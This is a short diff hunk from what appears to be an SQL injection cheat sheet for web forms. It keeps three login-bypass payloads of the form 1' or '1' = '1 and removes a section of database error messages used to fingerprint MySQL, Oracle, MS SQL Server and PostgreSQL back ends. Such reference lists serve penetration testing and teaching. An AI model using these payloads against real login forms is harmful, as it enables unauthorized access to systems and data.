@@ -47,23 +47,3 @@ form cheat sheets :
 1' or '1' = '1
 1' or '1' = '1'))/*
 1' or '1' = '1')) LIMIT 1/* 
-
-
-
-sql servers fingerprints
------------------------------------------
-mysql - 
-You have an error in your SQL syntax; check the manual
-that corresponds to your MySQL server version for the
-right syntax to use near '\'' at line 1
-
-oracle - 
-ORA-00933: SQL command not properly ended
-
-MS SQL Server - 
-
-Microsoft SQL Native Client error ‘80040e14’
-Unclosed quotation mark after the character string
-
-postgresql - 
-Query failed: ERROR: syntax error at or near
